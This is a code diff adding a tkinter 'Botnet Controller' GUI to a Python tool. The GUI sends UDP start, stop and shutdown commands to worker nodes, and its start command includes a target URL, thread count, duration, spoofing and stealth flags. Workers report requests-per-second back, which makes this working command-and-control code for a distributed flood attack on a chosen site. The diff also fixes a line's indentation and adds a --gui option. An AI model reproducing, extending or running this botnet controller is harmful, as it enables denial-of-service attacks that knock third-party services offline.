@@ -75,7 +75,7 @@ def run_worker(controller_addr, node_id, listen_port=9998):
                 def reader():
                     if proc and proc.stdout:
                         for line in proc.stdout:
-                        line = line.strip()
+                            line = line.strip()
                         if 'RPS=' in line:
                             import re
                             m = re.search(r'RPS=([\d,]+)', line)
@@ -110,6 +110,106 @@ def run_worker(controller_addr, node_id, listen_port=9998):
         except Exception as e:
             print(f"[{node_id}] Error: {e}")
             time.sleep(1)
+
+def run_controller_gui(port=9999):
+    """GUI Controller: tkinter-based controller."""
+    import tkinter as tk
+    from tkinter import ttk, scrolledtext
+    
+    root = tk.Tk()
+    root.title("dossal Botnet Controller")
+    root.geometry("600x400")
+    root.configure(bg='#1a1a2e')
+    
+    # State
+    workers = {}  # node_id -> (addr, stats, last_seen)
+    
+    # UDP socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(('0.0.0.0', port))
+    sock.settimeout(0.5)
+    
+    # UI
+    top = ttk.Frame(root, padding=5)
+    top.pack(fill=tk.X)
+    
+    ttk.Label(top, text="URL:").pack(side=tk.LEFT)
+    url_var = tk.StringVar(value="http://target:80")
+    ttk.Entry(top, textvariable=url_var, width=30).pack(side=tk.LEFT, padx=5)
+    
+    threads_var = tk.StringVar(value="8")
+    ttk.Label(top, text="Threads:").pack(side=tk.LEFT)
+    ttk.Entry(top, textvariable=threads_var, width=5).pack(side=tk.LEFT, padx=5)
+    
+    duration_var = tk.StringVar(value="30")
+    ttk.Label(top, text="Duration:").pack(side=tk.LEFT)
+    ttk.Entry(top, textvariable=duration_var, width=5).pack(side=tk.LEFT, padx=5)
+    
+    def do_start():
+        url = url_var.get().strip()
+        if not url:
+            return
+        cmd = {'cmd': 'start', 'url': url, 'mode': 'auto',
+               'duration': int(duration_var.get()), 'threads': int(threads_var.get()),
+               'spoof': 100, 'stealth': True, 'recovery': True}
+        for node, (addr, _, _) in workers.items():
+            sock.sendto(json.dumps(cmd).encode(), addr)
+        log.insert(tk.END, f"→ START {url} to {len(workers)} workers\n")
+        log.see(tk.END)
+    
+    def do_stop():
+        for node, (addr, _, _) in workers.items():
+            sock.sendto(json.dumps({'cmd': 'stop'}).encode(), addr)
+        log.insert(tk.END, f"→ STOP to {len(workers)} workers\n")
+        log.see(tk.END)
+    
+    def do_shutdown():
+        for node, (addr, _, _) in workers.items():
+            sock.sendto(json.dumps({'cmd': 'shutdown'}).encode(), addr)
+        log.insert(tk.END, f"→ SHUTDOWN to {len(workers)} workers\n")
+        log.see(tk.END)
+    
+    ttk.Button(top, text="START", command=do_start, style='Start.TButton').pack(side=tk.LEFT, padx=5)
+    ttk.Button(top, text="STOP", command=do_stop).pack(side=tk.LEFT, padx=5)
+    ttk.Button(top, text="SHUTDOWN", command=do_shutdown).pack(side=tk.LEFT, padx=5)
+    
+    # Workers table
+    mid = ttk.Frame(root, padding=5)
+    mid.pack(fill=tk.X)
+    ttk.Label(mid, text=f"Workers (port {port}):", foreground='white', background='#1a1a2e').pack(anchor=tk.W)
+    
+    workers_text = tk.Text(mid, height=6, bg='#0f0f23', fg='#00ff88', font=('Consolas', 10), state=tk.DISABLED)
+    workers_text.pack(fill=tk.X)
+    
+    # Log
+    bottom = ttk.Frame(root, padding=5)
+    bottom.pack(fill=tk.BOTH, expand=True)
+    log = scrolledtext.ScrolledText(bottom, height=10, bg='#0f0f23', fg='#ccc', font=('Consolas', 10))
+    log.pack(fill=tk.BOTH, expand=True)
+    log.insert(tk.END, f"[controller] GUI listening on :{port}\n")
+    
+    # Receive loop
+    def receive():
+        try:
+            data, addr = sock.recvfrom(65535)
+            msg = json.loads(data.decode())
+            node = msg.get('node', 'unknown')
+            workers[node] = (addr, msg, time.time())
+            # Update workers display
+            workers_text.config(state=tk.NORMAL)
+            workers_text.delete(1.0, tk.END)
+            for n, (a, m, s) in sorted(workers.items()):
+                age = time.time() - s
+                workers_text.insert(tk.END, f"  {n}: {m.get('status','?'):10s} RPS={m.get('rps',0):>10,} @ {a[0]}:{a[1]} ({age:.0f}s)\n")
+            workers_text.config(state=tk.DISABLED)
+        except socket.timeout:
+            pass
+        except Exception as e:
+            pass
+        root.after(500, receive)
+    
+    root.after(500, receive)
+    root.mainloop()
 
 def run_controller(port=9999):
     """Controller: send commands to workers, receive status."""
@@ -178,6 +278,7 @@ def main():
     ap.add_argument('--listen-port', type=int, default=9998, help='Worker listen port')
     ap.add_argument('--controller-addr', default=None, help='Controller address (for worker)')
     ap.add_argument('--id', default='node1', help='Node ID (for worker)')
+    ap.add_argument('--gui', action='store_true', help='Run controller with GUI')
     args = ap.parse_args()
     
     if args.worker:
@@ -186,6 +287,8 @@ def main():
             return
         host, port = args.controller_addr.rsplit(':', 1)
         run_worker((host, int(port)), args.id, args.listen_port)
+    elif args.gui:
+        run_controller_gui(args.port)
     else:
         run_controller(args.port)
 
